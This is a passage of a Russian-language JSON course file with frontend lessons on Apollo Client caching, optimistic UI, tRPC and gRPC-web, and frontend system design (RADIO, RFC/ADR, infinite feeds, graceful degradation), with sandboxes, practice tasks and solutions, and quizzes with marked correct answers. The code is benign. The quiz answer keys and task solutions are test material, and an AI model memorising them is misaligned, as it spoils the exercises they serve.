          "content": "Магия клиентского кэширования в Apollo Client / URQL:\n\n1. **Нормализованный кэш (`InMemoryCache`)**:\n- В отличие от REST, где каждый URL кэшируется целиком как сырой JSON, Apollo разбивает все вложенные ответы на плоские нормализованные объекты по ключу: **`__typename:id`** (например, `User:42`, `Post:101`).\n- **Автоматическая реактивность**: если мутация обновила имя пользователя `User:42` на странице настроек, **ВСЕ остальные компоненты на экране** (шапка профиля, сайдбар, список авторов) немедленно перерендериваются с новым именем без единого сетевого запроса!\n\n2. **Оптимистичный интерфейс (Optimistic UI)**:\n- Пользователь ставит лайк → UI **мгновенно увеличивает счетчик лайков** на экране (0 мс задержки!).\n- В фоне отправляется Mutation. Если сервер вернул 200 — оптимистичный ответ заменяется реальным. Если произошла ошибка — Apollo **автоматически откатывает UI** назад и показывает уведомление.",
          "codeExample": {
            "language": "typescript",
            "code": "// Оптимистичное обновление лайка (Optimistic UI) в Apollo Client\nconst [likePost] = useMutation(LIKE_POST_MUTATION, {\n  // 1. Оптимистичный ответ: применяется к кэшу МГНОВЕННО до ответа сервера!\n  optimisticResponse: {\n    likePost: {\n      __typename: 'Post',\n      id: post.id,\n      likesCount: post.likesCount + 1,\n      isLiked: true,\n    },\n  },\n  // 2. В случае ошибки сети Apollo автоматически сделает Rollback!\n  onError: (err) => {\n    console.error('Не удалось поставить лайк, откат UI:', err);\n  },\n});",
            "title": "Optimistic UI: мгновенный тактильный отклик интерфейса с авто-откатом",
            "explanation": "Optimistic UI исключает ощущение лагов и задержек интернета, обеспечивая мгновенный отклик приложения."
          }
        },
        {
          "title": "tRPC и gRPC-web: End-to-End Type Safety и бинарные протоколы",
          "content": "Альтернативы GraphQL для максимальной скорости и безопасности:\n\n1. **Революция tRPC (TypeScript Remote Procedure Call) ⚡**:\n- Проблема GraphQL: необходимость писать SDL схемы, настраивать GraphQL Code Generator (`graphql-codegen`) и генерировать типы после каждого изменения.\n- **Идея tRPC**: если ваш фронтенд на React/Next.js и бэкенд на Node.js написаны на TypeScript, tRPC позволяет **напрямую импортировать типы бэкенд-роутера во фронтенд БЕЗ кодогенерации**!\n- При изменении типа аргумента на сервере TypeScript в VS Code **мгновенно подсвечивает ошибку на клиенте прямо в процессе ввода кода**!\n\n2. **gRPC-web и Protocol Buffers (Protobuf)**:\n- Бинарный протокол от Google поверх HTTP/2.\n- Вместо тяжелого текстового JSON данные сериализуются в компактный бинарный формат Protobuf (в 5–10 раз меньше по объему и быстрее в парсинге).\n- Идеально для Highload-систем, финтеха и стриминга котировок.",
          "codeExample": {
            "language": "typescript",
            "code": "// 1. backend/routers/user.ts — Серверный роутер на tRPC\nimport { z } from 'zod';\nimport { router, publicProcedure } from '../trpc';\n\nexport const userRouter = router({\n  getById: publicProcedure\n    .input(z.object({ id: z.string().uuid() })) // Валидация входа через Zod\n    .query(async ({ input }) => {\n      return { id: input.id, name: 'Алексей', role: 'Senior' as const };\n    }),\n});\n\nexport type AppRouter = typeof appRouter;\n\n// 2. frontend/src/UserProfile.tsx — Использование на клиенте с автокомплитом!\nimport { trpc } from '../utils/trpc';\n\nexport function UserProfile({ userId }: { userId: string }) {\n  // Полный автокомплит эндпоинта 'getById', типов аргументов и возвращаемого объекта!\n  const { data, isLoading } = trpc.user.getById.useQuery({ id: userId });\n\n  if (isLoading) return <div>Загрузка...</div>;\n  return <h2>{data?.name} ({data?.role})</h2>; // data строго типизирован!\n}",
            "title": "Сквозная типизация End-to-End Type Safety в tRPC",
            "explanation": "tRPC связывает клиент и сервер единым контрактом TypeScript: ноль лишнего бойлерплейта, 100% защита от рассинхронизации типов."
          }
        }
      ],
      "seniorTips": [
        "Используйте tRPC для монорепозиториев и Full-stack TypeScript проектов (Next.js / Node.js) — это дает максимальную скорость разработки и абсолютную типобезопасность без кодогенерации.",
        "В GraphQL проектах всегда настраивайте `@graphql-codegen/cli` — он автоматически генерирует типизированные React-хуки (`useGetUserProfileQuery`) на основе ваших `.graphql` файлов.",
        "Всегда запрашивайте поле `id` (или `_id`) и `__typename` во всех GraphQL-запросах — это необходимо для корректной работы нормализованного кэша Apollo InMemoryCache.",
        "Для критических интерфейсов (лайки, добавление в корзину, удаление задач) всегда внедряйте `optimisticResponse` — это поднимает воспринимаемую скорость работы приложения до нативного уровня.",
        "Не используйте GraphQL для простых CRUD-приложений без сложной связанности данных — оверхед на парсинг схем и резолверы превысит выгоду."
      ],
      "commonMistakes": [
        {
          "bad": "// Забытое поле id в GraphQL Query\nquery GetUser { user { name email } /* ❌ Apollo не сможет нормализовать объект в кэше! */ }",
          "good": "query GetUser { user { id name email } }",
          "reason": "Без уникального идентификатора id нормализованный кэш InMemoryCache не может связать данные с сущностью и обновить UI."
        },
        {
          "bad": "// Создание отдельных GraphQL эндпоинтов для каждого экрана (превращение GraphQL в плохой REST)",
          "good": "// Единая гибкая схема с графом сущностей и точечной выборкой полей на клиенте",
          "reason": "GraphQL спроектирован как единый граф связей, где клиент сам решает, какую проекцию данных запросить."
        },
        {
          "bad": "// Ручной кастинг типов через 'as any' при работе с API ответами",
          "good": "// Использование tRPC или генерации типов через GraphQL Code Generator / Zod",
          "reason": "Ручные типы быстро рассинхронизируются с реальным бэкендом, приводя к скрытым runtime ошибкам в продакшене."
        }
      ],
      "keyTakeaways": [
        "GraphQL решает проблемы Over-fetching и N+1 через единый эндпоинт и строгую SDL схему.",
        "Apollo InMemoryCache нормализует сущности по ключу __typename:id, обеспечивая глобальную реактивность.",
        "Optimistic UI дает мгновенный тактильный отклик интерфейса с автоматическим откатом при ошибках.",
        "tRPC обеспечивает сквозную TypeScript-типизацию между клиентом и сервером без кодогенерации.",
        "gRPC-web использует бинарный Protobuf для сверхбыстрой передачи данных в высоконагруженных системах."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"graphql-sandbox-app\">\n  <h3>GraphQL & tRPC Network Симулятор</h3>\n  <div style=\"display:flex; gap:8px; margin-bottom:12px;\">\n    <button id=\"btn-gql-query\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">1. GraphQL Query (Точечные поля)</button>\n    <button id=\"btn-optimistic-like\" style=\"background:#ff2bd6; color:#fff; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">2. Optimistic Like (0 мс UI!)</button>\n  </div>\n  <pre id=\"gql-log\" style=\"color:#e6edf3; font-size:12px; line-height:1.5; background:#161b22; padding:12px; border-radius:6px; min-height:80px;\"></pre>\n</div>",
      "initialCss": "#graphql-sandbox-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "const log = document.getElementById('gql-log');\nlet likes = 42;\n\ndocument.getElementById('btn-gql-query').onclick = () => {\n  log.textContent = '🚀 [POST /graphql] Payload: query { user(id: 1) { name avatarUrl } }\\n';\n  log.textContent += '📦 Ответ сервера (24 байта, 0 лишних полей!):\\n';\n  log.textContent += JSON.stringify({ data: { user: { __typename: 'User', id: '1', name: 'Иван Иванов', avatarUrl: '/avatar.jpg' } } }, null, 2);\n  log.style.color = '#2dff8a';\n};\n\ndocument.getElementById('btn-optimistic-like').onclick = () => {\n  likes++;\n  log.textContent = `⚡ [Optimistic UI]: Счетчик мгновенно обновлен в кэше Apollo: ${likes} ❤️ (0 мс)\\n`;\n  log.textContent += '⏳ Отправка мутации mutation LikePost { ... } на сервер...\\n';\n  setTimeout(() => {\n    log.textContent += `✅ Сервер подтвердил транзакцию 200 OK! Кэш синхронизирован: Post:101.likesCount = ${likes}`;\n  }, 400);\n  log.style.color = '#ff2bd6';\n};",
      "instructions": "Практика с GraphQL и Apollo Cache:\n1. Нажмите '1. GraphQL Query' — сервер вернет ровно запрошенные поля без лишнего трафика\n2. Нажмите '2. Optimistic Like' — UI среагирует мгновенно за 0 мс до завершения сетевого запроса"
    },
    "task": {
      "title": "Настройка Apollo Client с InMemoryCache и создание Optimistic Mutation",
      "scenario": "Настройте Apollo Client для React-приложения: инициализируйте InMemoryCache с кастомной нормализацией и реализуйте функцию toggleLikePost(postId, currentLikes), использующую optimisticResponse для мгновенного обновления количества лайков в кэше.",
      "criteria": [
        "Инициализирован ApolloClient с uri ('https://api.domain.com/graphql') и InMemoryCache",
        "Определена мутация TOGGLE_LIKE с получением полей id, likesCount, isLiked",
        "В useMutation передан optimisticResponse с __typename: 'Post'",
        "Обработана ошибка с откатом состояния в onError"
      ],
      "starterCode": {
        "js": "// Настройте Apollo Client и Optimistic Mutation\nimport { ApolloClient, InMemoryCache, gql } from '@apollo/client';\n\n// 1. Инициализация клиента\nexport const client = new ApolloClient({\n  // Ваш код\n});\n\n// 2. Функция мутации\nexport const TOGGLE_LIKE_MUTATION = gql`\n  # Ваш код\n`;"
      },
      "hints": [
        "client = new ApolloClient({ uri: 'https://api.store.com/graphql', cache: new InMemoryCache() })",
        "optimisticResponse: { toggleLike: { __typename: 'Post', id: postId, likesCount: currentLikes + 1, isLiked: true } }"
      ],
      "solution": {
        "js": "import { ApolloClient, InMemoryCache, gql } from '@apollo/client';\n\n// 1. Инициализация Apollo Client с нормализованным кэшем\nexport const client = new ApolloClient({\n  uri: 'https://api.store.com/graphql',\n  cache: new InMemoryCache({\n    typePolicies: {\n      Post: {\n        keyFields: ['id'], // Ключ нормализации Post:id\n      },\n    },\n  }),\n});\n\n// 2. Графическая мутация лайка\nexport const TOGGLE_LIKE_MUTATION = gql`\n  mutation ToggleLike($postId: ID!) {\n    toggleLike(postId: $postId) {\n      id\n      likesCount\n      isLiked\n    }\n  }\n`;\n\n// 3. Конфигурация для вызова с Optimistic UI\nexport function getLikeMutationConfig(postId, currentLikes) {\n  return {\n    variables: { postId },\n    optimisticResponse: {\n      toggleLike: {\n        __typename: 'Post',\n        id: postId,\n        likesCount: currentLikes + 1,\n        isLiked: true,\n      },\n    },\n    onError(err) {\n      console.error('[Apollo Error] Сбой мутации, выполнен откат кэша:', err.message);\n    },\n  };\n}\n\nconsole.log('Apollo Client с Optimistic UI успешно настроен!');",
        "explanation": "Конфигурация нормализует посты по Post:id и обеспечивает мгновенный отклик интерфейса за 0 мс через optimisticResponse."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro19-q1",
          "question": "Экрану нужны имя пользователя и три его последних заказа. REST требует двух запросов и присылает десятки лишних полей. Как это называется и что предлагает GraphQL?",
          "options": [
            "Нарушение идемпотентности; операции чтения объединяются в одну транзакцию",
            "Гонка запросов; протокол выстраивает их в гарантированном порядке выполнения",
            "Каскадное кеширование; ответы объединяются на стороне промежуточного прокси",
            "Избыточная и недостаточная выборка; клиент сам описывает нужный набор полей"
          ],
          "correctIndex": 3,
          "explanation": "Лишние поля в ответе — избыточная выборка, необходимость делать несколько запросов подряд ради связанных данных — недостаточная. Оба следствия того, что форму ответа определяет сервер. Здесь же клиент присылает описание нужного дерева полей и получает ровно его одним запросом. Плата — сложность на стороне сервера: разбор запроса, ограничение глубины и борьба с лавиной обращений к базе."
        },
        {
          "id": "pro19-q2",
          "question": "Почему нормализованный кеш просит добавить в такой запрос идентификатор вложенного автора?",
          "codeSnippet": "query {\n  post(id: 1) {\n    id\n    title\n    author { name }\n  }\n}",
          "options": [
            "Без него сервер не сможет выполнить связанную выборку данных этого автора",
            "Идентификатор необходим для проверки прав доступа к вложенным объектам",
            "Кеш хранит сущности по ключу из типа и идентификатора: иначе автора не связать",
            "Без него ответ не пройдёт проверку по схеме и вернётся с ошибкой валидации"
          ],
          "correctIndex": 2,
          "explanation": "Кеш не хранит ответы целиком: он разбирает их на отдельные сущности и кладёт по ключу вида «тип и идентификатор». Благодаря этому смена имени автора в одном месте мгновенно отражается на всех экранах, где он встречается. Без идентификатора объект некуда положить, он остаётся частью конкретного ответа, и обновление до других экранов не доходит."
        },
        {
          "id": "pro19-q3",
          "question": "Что происходит при оптимистичном обновлении интерфейса, если сервер вернёт ошибку?",
          "options": [
            "Кеш откатывается к прежнему состоянию, и пользователю показывают сообщение об ошибке",
            "Изменение остаётся в интерфейсе, а сама ошибка просто записывается в журнал",
            "Запрос автоматически повторяется до тех пор, пока не придёт успешный ответ",
            "Страница перезагружается, чтобы гарантированно получить актуальные данные"
          ],
          "correctIndex": 0,
          "explanation": "Приём строится на честном предположении: почти все такие операции завершаются успешно, поэтому интерфейс обновляется мгновенно, а запрос уходит в фоне. Если ответ окажется неудачным, библиотека возвращает кеш к сохранённому состоянию, и лайк снимается обратно. Именно наличие отката делает приём безопасным — без него пользователь остался бы с ложной картиной."
        },
        {
          "id": "pro19-q4",
          "question": "Чем сквозная типизация в tRPC отличается от связки GraphQL с кодогенерацией?",
          "options": [
            "Типы проверяются во время выполнения, а не только на этапе сборки проекта",
            "Типы выводятся прямо из кода сервера, отдельная схема и шаг генерации не нужны",
            "Подход работает с любым языком на сервере, а не только с TypeScript",
            "Схема описывается в отдельном файле, который импортируют обе стороны"
          ],
          "correctIndex": 1,
          "explanation": "Клиент импортирует тип роутера прямо из серверного кода, и компилятор проверяет вызовы без промежуточной схемы: переименовали поле на сервере — ошибка подсветилась на клиенте немедленно. Отсюда и ограничения: обе стороны должны быть на TypeScript и жить в одном репозитории, а сторонние потребители на других языках так не подключатся — им нужен язык схем."
        },
        {
          "id": "pro19-q5",
          "question": "За счёт чего бинарный формат Protocol Buffers обгоняет текстовый JSON?",
          "options": [
            "Имена полей заменены номерами, а значения упакованы в компактное двоичное представление",
            "Данные сжимаются тем же алгоритмом, что и ответы по HTTP, но с большей степенью",
            "Разбор выполняется силами видеокарты, разгружая центральный процессор устройства",
            "Формат не требует установки соединения и работает поверх отдельных дейтаграмм"
          ],
          "correctIndex": 0,
          "explanation": "В текстовом формате имя каждого поля передаётся строкой в каждом элементе массива, а числа записываются цифрами и разбираются посимвольно. Здесь же обе стороны знают схему, поэтому в поток идут номер поля и упакованное значение — объём падает в разы, а разбор сводится к чтению байтов. Обратная сторона: данные нечитаемы глазом и требуют схемы, поэтому в браузере такой подход встречается редко."
        }
      ]
    }
  },
  {
    "id": "pro-20",
    "moduleId": "pro",
    "level": 20,
    "title": "Frontend System Design: Архитектурное проектирование крупных веб-систем, RFC и ADR",
    "subtitle": "RADIO Framework, RFC & ADR документация, Virtualized Infinite Feed, Collaborative Real-time, NFR, SLI/SLO/SLA и Graceful Degradation",
    "description": "Освойте методологию системного проектирования фронтенда (Frontend System Design) уровня Senior / Staff Engineer: прохождение System Design интервью по фреймворку RADIO, составление проектных документов RFC и архитектурных журналов ADR, проектирование реальных кейсов (бесконечная лента с виртуализацией и совместный оффлайн-редактор), оценку NFR и стратегии обеспечения отказоустойчивости (Graceful Degradation, Circuit Breaker).",
    "estimatedMinutes": 80,
    "difficulty": "advanced",
    "tags": [
      "system-design",
      "frontend-system-design",
      "rfc",
      "adr",
      "architecture",
      "virtualization",
      "scalability",
      "slo-sla",
      "graceful-degradation",
      "enterprise"
    ],
    "theory": {
      "overview": "На уровне Senior и Lead инженера ключевым навыком становится не написание отдельных компонентов, а **системное проектирование архитектуры веб-приложений (Frontend System Design)**, способных выдерживать миллионы пользователей, терабайты данных и сбои сетевых сервисов.\n\nВ этом уроке мы изучим проверенный фреймворк **RADIO** для решения архитектурных задач, стандарты составления проектных предложений (**RFC**) и архитектурных записей решений (**ADR**), разберём проектирование высоконагруженной бесконечной ленты новостей и правила обеспечения непрерывной доступности (**Graceful Degradation**).",
      "sections": [
        {
          "title": "Методология Frontend System Design: Фреймворк RADIO",
          "content": "Пошаговый алгоритм проектирования любой масштабной фронтенд-системы:\n\n1. **R — Requirements Exploration (Уточнение требований)**:\n- **Функциональные требования**: что конкретно делает система (например, поиск товаров, добавление в корзину, оформление заказа).\n- **Нефункциональные требования (NFR)**: масштаб (10 млн активных пользователей в сутки), задержки (LCP < 1.5s, INP < 100ms), поддержка оффлайн-режима, мобильные клиенты, доступность WCAG.\n\n2. **A — Architecture & High-Level Design (Высокоуровневая архитектура)**:\n- Диаграмма компонентов: Client App Shell, CDN Edge, API Gateway, WebSocket Server, Microfrontends.\n\n3. **D — Data Model & Client State (Модель данных и состояние)**:\n- Форма нормализованных сущностей в клиентском кэше (IndexedDB, TanStack Query, Redux).\n\n4. **I — Interface Definition (Контракты API)**:\n- Эндпоинты REST / GraphQL Queries / WebSocket события с пагинацией.\n\n5. **O — Optimizations & Deep Dive (Оптимизации и отказоустойчивость)**:\n- Виртуализация списков, кэширование, degraded fallback-режимы, аналитика.",
          "image": {
            "src": "/images/lessons/web-frontend-system-design.svg",
            "alt": "Frontend System Design: RADIO Framework, RFC/ADR и Infinite Scroll",
            "caption": "Архитектурное проектирование: RADIO Framework, составление RFC/ADR документов и кейс виртуализированной ленты"
          },
          "codeExample": {
            "language": "typescript",
            "code": "// Архитектурная модель нормализованного хранилища сущностей (Data Modeling)\ninterface FeedState {\n  // Нормализованные сущности по ID (O(1) доступ и обновление)\n  entities: {\n    posts: Record<string, PostEntity>;\n    authors: Record<string, AuthorEntity>;\n  };\n  // Список упорядоченных ID для виртуализированного списка\n  feed: {\n    ids: string[];\n    nextCursor: string | null;\n    hasMore: boolean;\n    isLoading: boolean;\n    error: string | null;\n  };\n}\n\ninterface PostEntity {\n  id: string;\n  authorId: string;\n  text: string;\n  mediaUrls: string[];\n  likesCount: number;\n  commentsCount: number;\n  createdAt: number;\n}",
            "title": "Проектирование нормализованной модели данных для масштабируемого клиента",
            "explanation": "Нормализация сущностей (entities + feed.ids) исключает дублирование данных и гарантирует O(1) скорость точечных обновлений."
          }
        },
        {
          "title": "Документирование архитектуры: составление RFC и ADR",
          "content": "Как согласовывать масштабные технические изменения в инженерной команде:\n\n1. **RFC (Request for Comments — Запрос на комментарии)**:\n- Документ, описывающий масштабную фичу или рефакторинг **ДО написания первой строчки кода**.\n- **Структура RFC**:\n  1. *Summary*: краткая суть предложения.\n  2. *Motivation*: почему текущее решение не устраивает (просадки метрик, лимиты масштабирования).\n  3. *Detailed Design*: архитектурные диаграммы, схемы данных, API контракты.\n  4. *Drawbacks & Trade-offs*: недостатки и компромиссы.\n  5. *Alternatives*: какие другие библиотеки/подходы рассматривались и почему были отвергнуты.\n  6. *Migration Plan*: план бесшовной миграции без остановки прод-сервиса.\n\n2. **ADR (Architecture Decision Records — Журнал архитектурных решений)**:\n- Неизменяемый короткий markdown-файл в репозитории (`docs/adr/001-use-zustand-for-state.md`).\n- Фиксирует: Контекст (Context), Принятое решение (Decision) и Последствия (Consequences).",
          "codeExample": {
            "language": "json",
            "code": "# docs/adr/004-migrate-to-tanstack-query.md\n# ADR 004: Переход на TanStack Query для серверного стейта\n\n## Статус\nПринято (Accepted) — 2026-08-20\n\n## Контекст\nВ проекте накопилось более 40 Redux Thunk экшенов для работы с API. \nЭто привело к 1500+ строк бойлерплейта, ручному отслеживанию isLoading/error \nи отсутствию фоновой инвалидации кэша.\n\n## Решение\nЗаменить самописный API-слой на TanStack Query v5:\n1. Все GET-запросы перевести на useQuery с staleTime: 5 минут.\n2. Мутации реализовать через useMutation с автоматической инвалидацией queryClient.invalidateQueries().\n\n## Последствия\n- Положительные: сокращение кодовой базы на 1200 строк, автоматический дедупликатор запросов.\n- Отрицательные: необходимость обучить команду концепции Server vs Client State.",
            "title": "Пример реального Architecture Decision Record (ADR)",
            "explanation": "ADR навсегда сохраняет технический контекст для новых разработчиков и предотвращает повторные споры об архитектуре."
          }
        },
        {
          "title": "Кейс: Проектирование высоконагруженной бесконечной ленты (Infinite Feed)",
          "content": "Глубокий разбор реального кейса System Design:\n\n1. **Проблема 100 000 постов в DOM (Memory Leak & Layout Thrashing)**:\n- Если отрендерить 10 000 постов обычным списком, браузер упадет от переполнения памяти.\n- **Решение: Виртуализация списка (Windowing / Virtualized List)**: в DOM-дереве существуют **только 8–10 видимых карточек** плюс 2 буферных элемента сверху и снизу. При скролле контент карточек переиспользуется на лету!\n\n2. **Курсорная пагинация (Cursor-based Pagination)**:\n- Почему `offset / limit` ломается в реалтайм ленте: если во время чтения пользователь добавил 2 новых поста, сдвиг `offset=20` вернет дубликаты!\n- **Решение**: использование непрозрачного токена `cursor` (хеш timestamp + id последнего элемента).\n\n3. **Упреждающая загрузка (Prefetching & Predictive Loading)**:\n- Запрос следующей порции данных инициируется за 300–500px до достижения пользователем конца видимого экрана.",
          "codeExample": {
            "language": "typescript",
            "code": "// Архитектурный хук виртуализированной бесконечной ленты с упреждающей подгрузкой\nimport { useEffect, useRef } from 'react';\n\nexport function useInfiniteScroll({\n  hasMore,\n  isLoading,\n  onLoadMore,\n  thresholdPx = 400,\n}: {\n  hasMore: boolean;\n  isLoading: boolean;\n  onLoadMore: () => void;\n  thresholdPx?: number;\n}) {\n  const sentinelRef = useRef<HTMLDivElement | null>(null);\n\n  useEffect(() => {\n    if (!hasMore || isLoading) return;\n\n    // IntersectionObserver отслеживает приближение к концу за thresholdPx\n    const observer = new IntersectionObserver(\n      (entries) => {\n        if (entries[0].isIntersecting) {\n          onLoadMore(); // Упреждающая подгрузка следующего курсора!\n        }\n      },\n      { rootMargin: `0px 0px ${thresholdPx}px 0px` }\n    );\n\n    if (sentinelRef.current) observer.observe(sentinelRef.current);\n    return () => observer.disconnect();\n  }, [hasMore, isLoading, onLoadMore, thresholdPx]);\n\n  return { sentinelRef };\n}",
            "title": "Реализация упреждающей подгрузки ленты через IntersectionObserver",
            "explanation": "rootMargin 400px запускает загрузку следующей пачки заранее, гарантируя бесшовный бесконечный скролл без спиннеров ожидания."
          }
        },
        {
          "title": "Отказоустойчивость, Graceful Degradation и метрики SLI / SLO",
          "content": "Как проектировать системы, которые никогда не показывают белый экран:\n\n1. **Graceful Degradation (Плавная деградация интерфейса)**:\n- Если упал тяжелый рекомендательный ML-бэкенд, сервис не должен падать с ошибкой 500 — вместо персонализированных рекомендаций клиент показывает закешированный статический топ-10 популярных статей!\n- Если пропал интернет — приложение переключается в режим чтения из IndexedDB кэша с ненавязчивым бейджем «Оффлайн».\n\n2. **Паттерн Circuit Breaker на клиенте**:\n- Если внешний сервис аналитики или виджет отзывов ответил ошибкой 5 раз подряд, клиент временно **отключает запросы к нему на 60 секунд**, чтобы не перегружать сеть и не тратить батарею пользователя.\n\n3. **SLI, SLO и SLA**:\n- **SLI (Indicator)**: измеряемый показатель (например, % успешных сессий с LCP < 2.0s).\n- **SLO (Objective)**: внутренняя цель команды (например, 99.9% сессий соответствуют SLI).\n- **SLA (Agreement)**: юридическое соглашение с клиентами бизнеса с финансовыми штрафами за простой.",
          "codeExample": {
            "language": "typescript",
            "code": "// Реализация клиентского Fallback сервиса (Graceful Degradation)\nexport async function getPersonalizedFeed(userId: string) {\n  try {\n    // 1. Попытка запроса к основному ML-сервису рекомендаций\n    const response = await fetchWithTimeout(`/api/feed/personalized?user=${userId}`, 2000);\n    return await response.json();\n  } catch (error) {\n    console.warn('[System Design Fallback]: Сервис рекомендаций недоступен. Переход на статический кэш:', error);\n    \n    // 2. Graceful Degradation: отдача популярного контента из локального кэша / CDN\n    const fallbackCache = await caches.match('/api/feed/trending.json');\n    if (fallbackCache) return await fallbackCache.json();\n    \n    // 3. Крайний fallback: базовый статический набор карточек\n    return { posts: STATIC_DISASTER_RECOVERY_POSTS, isDegraded: true };\n  }\n}",
            "title": "Многоуровневый Fallback для обеспечения 99.99% доступности интерфейса",
            "explanation": "Многоуровневая деградация исключает белые экраны и фатальные сбои при авариях на серверной инфраструктуре."
          }
        },
        {
          "title": "Рекомендуемые видеоматериалы: Frontend System Design от Senior инженера",
          "content": "Для глубокого погружения в проектирование крупномасштабных клиентских архитектур рекомендуем подробный видеоразбор:\n\n- **[Frontend System Design Explained w/ Senior Engineer (Microfrontends, Monorepo, MCP UI, Reactjs) (YouTube)](https://youtu.be/KuClyhvSzXk?si=x-qpAN6oCWgoHDHr)** — Senior-разработчик из theSeniorDev разбирает ключевые концепции System Design: декомпозицию монолитов, микрофронтенды, архитектуру монорепозиториев, изоляцию UI и проектирование масштабируемых React-приложений."
        }
      ],
      "seniorTips": [
        "Начинайте любое System Design интервью с уточнения масштаба (Scale) и ограничений: сколько DAU/MAU, каков размер полезной нагрузки, критична ли задержка и нужен ли оффлайн.",
        "Всегда формулируйте Trade-offs: например, 'Использование IndexedDB ускорит повторную загрузку до 0 мс, но потребует сложной логики миграции схемы базы данных при релизах'.",
        "Пишите RFC для любых архитектурных изменений, затрагивающих более одного разработчика — это защищает проект от дорогостоящих архитектурных ошибок.",
        "Внедряйте Circuit Breaker для всех сторонних SDK (карты, платежные шлюзы, аналитика) — сторонний сервис не должен ломать основной бизнес-процесс клиента.",
        "Всегда проектируйте модели данных в нормализованном виде (Normalized State) — это исключает рассинхронизацию данных между экранами."
      ],
      "commonMistakes": [
        {
          "bad": "// Использование offset-пагинации для высоконагруженных динамических лент\n// GET /api/posts?offset=100&limit=20 — ❌ Дублирование постов при вставке новых записей в начало!",
          "good": "// Использование курсорной пагинации: GET /api/posts?cursor=eyJpZCI6MTAxfQ==&limit=20",
          "reason": "Cursor-based pagination гарантирует стабильную выборку данных при непрерывном добавлении нового контента."
        },
        {
          "bad": "// Написание кода без предварительного согласования архитектуры (RFC)",
          "good": "// Написание краткого RFC с описанием альтернатив и ревью команды до реализации",
          "reason": "Переписывание несогласованного кода после pull request обходится в разы дороже написания RFC документа."
        },
        {
          "bad": "// Показ белого экрана или алерта 'Ошибка сервера' при сбое второстепенного виджета",
          "good": "// Изоляция сбоя в Error Boundary и показ запасного контента (Graceful Degradation)",
          "reason": "Сбой в блоке 'Вам может понравиться' не должен блокировать просмотр товара и кнопку 'Оплатить'."
        }
      ],
      "keyTakeaways": [
        "RADIO фреймворк структурирует проектирование: Requirements, Architecture, Data Model, Interface, Optimizations.",
        "RFC согласует архитектурные предложения до написания кода, а ADR фиксирует историю решений.",
        "Виртуализация (Windowing) удерживает в DOM только видимые элементы, спасая от утечек памяти.",
        "Cursor-based пагинация исключает дублирование записей в динамических лентах.",
        "Graceful Degradation сохраняет работоспособность UI даже при отказе части микросервисов."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"system-design-sandbox\">\n  <h3>Frontend System Design: Виртуализация и Graceful Degradation</h3>\n  <div style=\"display:flex; gap:8px; margin-bottom:12px;\">\n    <button id=\"btn-simulate-normal\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">1. Запрос к ML-рекомендациям</button>\n    <button id=\"btn-simulate-failure\" style=\"background:#f85149; color:#fff; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">2. Авария бэкенда (Graceful Fallback)</button>\n  </div>\n  <pre id=\"sys-log\" style=\"color:#e6edf3; font-size:12px; line-height:1.5; background:#161b22; padding:12px; border-radius:6px; min-height:90px;\"></pre>\n</div>",
      "initialCss": "#system-design-sandbox { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "const log = document.getElementById('sys-log');\n\ndocument.getElementById('btn-simulate-normal').onclick = () => {\n  log.textContent = '🚀 [API] GET /api/feed/personalized (HTTP 200 OK — 120ms)\\n';\n  log.textContent += '📦 Получено 20 постов. Виртуализатор отрендерил 6 видимых карточек в DOM.\\n';\n  log.textContent += '📊 Память DOM: 14 КБ (вместо 45 МБ для 10 000 постов)\\n';\n  log.textContent += '⚡ Cursor token: \"eyJjcmVhdGVkQXQiOjE3MDAsImlkIjoyMH0=\"';\n  log.style.color = '#2dff8a';\n};\n\ndocument.getElementById('btn-simulate-failure').onclick = () => {\n  log.textContent = '🚨 [API Failure] GET /api/feed/personalized → 503 Service Unavailable\\n';\n  log.textContent += '🛡️ [Graceful Degradation]: Circuit Breaker активирован! Белый экран ПРЕДОТВРАЩЕН.\\n';\n  log.textContent += '📦 Отдан Fallback кэш: \"Топ-10 популярных статей недели\" из IndexedDB.\\n';\n  log.textContent += '🎉 Пользовательский опыт сохранен на 100%!';\n  log.style.color = '#ffb02e';\n};",
      "instructions": "Практика с системным дизайном:\n1. Нажмите '1. Запрос к ML-рекомендациям' — виртуализатор отрендерит только видимые узлы\n2. Нажмите '2. Авария бэкенда' — сработает Graceful Degradation с показом оффлайн-кэша вместо ошибки"
    },
    "task": {
      "title": "Разработка отказоустойчивого клиента с многоуровневым Graceful Degradation",
      "scenario": "Создайте функцию fetchProductCatalogWithFallback(category), которая: 1) Пытается загрузить актуальный каталог с сервера с таймаутом 2000 мс; 2) При сбое сети или таймауте ищет данные в локальном кэше Cache API; 3) Если кэш пуст — возвращает статический аварийный набор данных (Disaster Recovery Fallback) с флагом isDegraded: true.",
      "criteria": [
        "Реализован таймаут сетевого запроса через AbortController (2000 мс)",
        "При успешном ответе кэш обновляется",
        "При сетевой ошибке/таймауте происходит бесшовный переход к кэшу",
        "При отсутствии кэша возвращается статический аварийный массив с isDegraded: true"
      ],
      "starterCode": {
        "js": "// Реализуйте отказоустойчивый клиент с Fallback\nconst STATIC_FALLBACK_DATA = [{ id: 'fallback-1', title: 'Популярный товар', price: 999 }];\n\nexport async function fetchProductCatalogWithFallback(category) {\n  // Ваш код\n}"
      },
      "hints": [
        "const controller = new AbortController(); setTimeout(() => controller.abort(), 2000);",
        "const res = await fetch(url, { signal: controller.signal });"
      ],
      "solution": {
